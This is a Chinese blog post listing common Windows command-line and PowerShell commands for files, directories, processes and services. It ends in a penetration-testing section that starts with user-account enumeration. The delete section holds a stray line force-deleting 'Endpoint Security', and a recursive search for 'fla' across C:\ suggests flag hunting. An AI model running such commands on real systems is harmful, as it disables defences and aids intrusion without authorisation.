<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>Windows常用命令 - 东隅 Blog</title><meta name="author" content="东隅">
<meta name="author-link" content="">
<meta name="description" content="" /><meta name="keywords" content='计算机基础, 操作系统' />
  <meta itemprop="name" content="windows常用命令">
  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
  <meta itemprop="wordCount" content="1222">
  <meta itemprop="keywords" content="计算机基础,操作系统"><meta property="og:url" content="https://dongyu29.github.io/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E7%B3%BB%E7%BB%9F/windows/90/">
  <meta property="og:site_name" content="东隅 Blog">
  <meta property="og:title" content="windows常用命令">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
    <meta property="article:tag" content="计算机基础">
    <meta property="article:tag" content="操作系统">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="windows常用命令">
<meta name="application-name" content="FixIt">
<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E7%B3%BB%E7%BB%9F/windows/90/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/54/" /><link rel="next" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/60/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "windows常用命令",
    "inLanguage": "en",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https:\/\/dongyu29.github.io\/posts\/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80\/%E7%B3%BB%E7%BB%9F\/windows\/90\/"
    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "计算机基础, 操作系统","wordcount":  1222 ,
    "url": "https:\/\/dongyu29.github.io\/posts\/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80\/%E7%B3%BB%E7%BB%9F\/windows\/90\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
      "@type": "Organization",
      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
        "@type": "Person",
        "name": "东隅"
      },"description": ""
  }
  </script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/posts/"
                  
                  
                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">Windows常用命令</li>
    </ol>
  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Windows常用命令</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" class="post-category" title="Category - 计算机基础"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 计算机基础</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="1222 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1300 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>6 minutes</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Contents</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#读文件">读文件</a></li>
    <li><a href="#写文件">写文件</a></li>
    <li><a href="#找文件">找文件</a></li>
    <li><a href="#找内容">找内容</a></li>
    <li><a href="#读目录">读目录</a></li>
    <li><a href="#删文件">删文件</a></li>
    <li><a href="#删目录">删目录</a></li>
    <li><a href="#创建文件目录">创建文件&amp;目录</a></li>
  </ul>

  <ul>
    <li>
      <ul>
        <li></li>
      </ul>
    </li>
  </ul>
</nav></div>
      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h1 id="文件目录" class="heading-element"><span>文件&amp;目录</span>
  <a href="#%e6%96%87%e4%bb%b6%e7%9b%ae%e5%bd%95" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><h2 id="读文件" class="heading-element"><span>读文件</span>
  <a href="#%e8%af%bb%e6%96%87%e4%bb%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>type 命令：
用法：type 文件路径
示例：type C:\path\to\file.txt
作用：显示文件的内容。


more 命令：
用法：more 文件路径
示例：more C:\path\to\file.txt
作用：逐页显示文件的内容，按空格键显示下一页，按回车键显示下一行。

find 命令：
用法：find &#34;要查找的字符串&#34; 文件路径
示例：find &#34;Hello&#34; C:\path\to\file.txt
作用：在文件中查找指定字符串，并显示匹配的行。

powershell 命令：
用法：powershell Get-Content -Path 文件路径
示例：powershell Get-Content -Path C:\path\to\file.txt
作用：使用 PowerShell 命令获取文件的内容，与type命令类似。</code></pre><h2 id="写文件" class="heading-element"><span>写文件</span>
  <a href="#%e5%86%99%e6%96%87%e4%bb%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>echo 命令：
用法：echo 内容 &gt; 文件路径
示例：echo Hello, World! &gt; C:\path\to\file.txt
作用：将指定的内容写入文件。如果文件不存在，则创建新文件；如果文件已存在，则覆盖原有内容。

echo 命令（追加模式）：
用法：echo 内容 &gt;&gt; 文件路径
示例：echo New line &gt;&gt; C:\path\to\file.txt
作用：将指定的内容追加到文件末尾。如果文件不存在，则创建新文件。

copy con 命令（逐行写入）：
用法：copy con 文件路径
示例：copy con C:\path\to\file.txt
作用：以逐行的方式从键盘输入内容，并将输入的内容写入文件。按 Ctrl + Z 组合键结束输入。

powershell 命令：
用法：powershell Set-Content -Path 文件路径 -Value 内容
示例：powershell Set-Content -Path C:\path\to\file.txt -Value &#34;Hello, World!&#34;
作用：使用 PowerShell 命令将指定的内容写入文件。如果文件不存在，则创建新文件；如果文件已存在，则覆盖原有内容。</code></pre><h2 id="找文件" class="heading-element"><span>找文件</span>
  <a href="#%e6%89%be%e6%96%87%e4%bb%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>dir 命令：
用法：dir /s 文件名
示例：dir /s myfile.txt
作用：在当前目录及其子目录下递归搜索指定文件名的文件，并列出匹配的文件路径。

where 命令：
用法：where 文件名
示例：where myfile.txt
作用：在系统的可执行文件路径中搜索指定文件名，并列出匹配的文件路径。

find 命令：
用法：find /i &#34;文件名&#34; 目录路径
示例：find /i &#34;myfile.txt&#34; C:\path\to\directory
作用：在指定目录下递归搜索指定文件名的文件，并显示匹配的文件路径。

powershell 命令：
用法：powershell Get-ChildItem -Path 目录路径 -Filter &#34;文件名&#34; -Recurse
示例：powershell Get-ChildItem -Path C:\path\to\directory -Filter &#34;myfile.txt&#34; -Recurse
作用：使用 PowerShell 命令在指定目录下递归搜索指定文件名的文件，并列出匹配的文件路径。</code></pre><h2 id="找内容" class="heading-element"><span>找内容</span>
  <a href="#%e6%89%be%e5%86%85%e5%ae%b9" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>findstr 命令：
用法：findstr /s /i /c:&#34;fla&#34; C:\
作用：在根目录 C:\ 下递归搜索文件内容，并匹配包含 &#34;fla&#34; 的文本行。
参数说明：
/s：递归地在子目录中搜索文件。
/i：忽略大小写进行匹配。
/c:&#34;fla&#34;：指定要搜索的文本字符串。

dir 命令和 find 命令的组合：
用法：dir C:\ /s /b | find /i &#34;fla&#34;
作用：在根目录 C:\ 下递归搜索文件，并匹配包含 &#34;fla&#34; 的文件路径。
参数说明：
dir C:\ /s /b：递归地列出根目录 C:\ 下的所有文件路径。
|：将 dir 命令的输出作为 find 命令的输入。
find /i &#34;fla&#34;：在输入中查找包含 &#34;fla&#34; 的行。</code></pre><h2 id="读目录" class="heading-element"><span>读目录</span>
  <a href="#%e8%af%bb%e7%9b%ae%e5%bd%95" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>dir 命令：
用法：dir 目录路径
示例：dir C:\path\to\directory
作用：列出指定目录下的文件和子目录。

tree 命令：
用法：tree 目录路径
示例：tree C:\path\to\directory
作用：以树状结构显示指定目录及其子目录的文件和子目录。

powershell 命令：
用法：powershell Get-ChildItem -Path 目录路径
示例：powershell Get-ChildItem -Path C:\path\to\directory
作用：使用 PowerShell 命令列出指定目录下的文件和子目录。</code></pre><h2 id="删文件" class="heading-element"><span>删文件</span>
  <a href="#%e5%88%a0%e6%96%87%e4%bb%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>del 命令：
用法：del 文件路径
示例：del C:\path\to\file.txt
作用：删除指定的文件。

erase 命令：
用法：erase 文件路径
示例：erase C:\path\to\file.txt
作用：删除指定的文件。

del /f 命令（强制删除）：
用法：del /f 文件路径
示例：del /f C:\path\to\file.txt
作用：强制删除指定的文件，即使文件是只读或系统文件。

del /p 命令（提示确认）：
用法：del /p 文件路径
示例：del /p C:\path\to\file.txt
作用：删除指定的文件之前，会提示你确认是否删除。

del /f &#34;Endpoint Security&#34;</code></pre><h2 id="删目录" class="heading-element"><span>删目录</span>
  <a href="#%e5%88%a0%e7%9b%ae%e5%bd%95" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>rmdir 命令：
用法：rmdir /s /q 目录路径
示例：rmdir /s /q C:\path\to\directory
作用：删除指定目录及其子目录中的所有文件和子目录。
参数说明：
/s：递归地删除目录及其子目录中的文件和子目录。
/q：安静模式，不要求确认删除操作。

rd 命令：
用法：rd /s /q 目录路径
示例：rd /s /q C:\path\to\directory
作用：删除指定目录及其子目录中的所有文件和子目录。
参数说明：
/s：递归地删除目录及其子目录中的文件和子目录。
/q：安静模式，不要求确认删除操作。</code></pre><h2 id="创建文件目录" class="heading-element"><span>创建文件&amp;目录</span>
  <a href="#%e5%88%9b%e5%bb%ba%e6%96%87%e4%bb%b6%e7%9b%ae%e5%bd%95" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>创建文件：

echo 命令：
用法：echo. &gt; 文件路径
示例：echo. &gt; C:\path\to\file.txt
作用：创建一个空文件。
注意：echo. 后面的空格是必需的。

type nul 命令：
用法：type nul &gt; 文件路径
示例：type nul &gt; C:\path\to\file.txt
作用：创建一个空文件。

创建目录：

mkdir 命令：
用法：mkdir 目录路径
示例：mkdir C:\path\to\directory
作用：创建一个新的目录。

md 命令：
用法：md 目录路径
示例：md C:\path\to\directory
作用：创建一个新的目录。</code></pre><h1 id="进程" class="heading-element"><span>进程</span>
  <a href="#%e8%bf%9b%e7%a8%8b" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><ol>
<li>
<p>tasklist：显示当前系统上运行的所有进程的列表。</p>
<pre tabindex="0"><code>tasklist</code></pre></li>
<li>
<p>taskkill：终止指定的进程。</p>
<pre tabindex="0"><code>taskkill /PID &lt;PID&gt;
taskkill /F /PID &lt;PID&gt; qi</code></pre></li>
<li>
<p>wmic process：使用 Windows 管理控制台 (WMI) 查询和管理进程信息。</p>
<pre tabindex="0"><code>wmic process get Caption,ProcessId,CommandLine</code></pre></li>
<li>
<p>sc：用于管理 Windows 服务，包括启动、停止和查询服务进程。</p>
<pre tabindex="0"><code>sc query
sc start &lt;service_name&gt;
sc stop &lt;service_name&gt;</code></pre></li>
<li>
<p>netstat：显示与网络连接相关的进程信息。</p>
<pre tabindex="0"><code>netstat -ano</code></pre></li>
<li>
<p>pslist：Sysinternals Suite 中的工具，用于显示详细的进程信息，包括进程的父子关系、线程信息等。</p>
<pre tabindex="0"><code>pslist</code></pre></li>
<li>
<p>handle：Sysinternals Suite 中的工具，用于查找打开文件、注册表项等的进程。</p>
<pre tabindex="0"><code>handle &lt;file_path&gt;</code></pre></li>
</ol>
<h1 id="渗透命令" class="heading-element"><span>渗透命令</span>
  <a href="#%e6%b8%97%e9%80%8f%e5%91%bd%e4%bb%a4" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><h4 id="1-net命令httpsbookshentoushitopinfowin_infohtml1-net命令" class="heading-element"><span><a href="https://book.shentoushi.top/Info/Win_info.html#1-net%e5%91%bd%e4%bb%a4"target="_blank" rel="external nofollow noopener noreferrer">1. net命令</a></span>
  <a href="#1-net%e5%91%bd%e4%bb%a4httpsbookshentoushitopinfowin_infohtml1-net%e5%91%bd%e4%bb%a4" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><pre tabindex="0"><code>查看用户列表: net user

powershell查看用户列表: Get-WmiObject -Class Win32_UserAccount

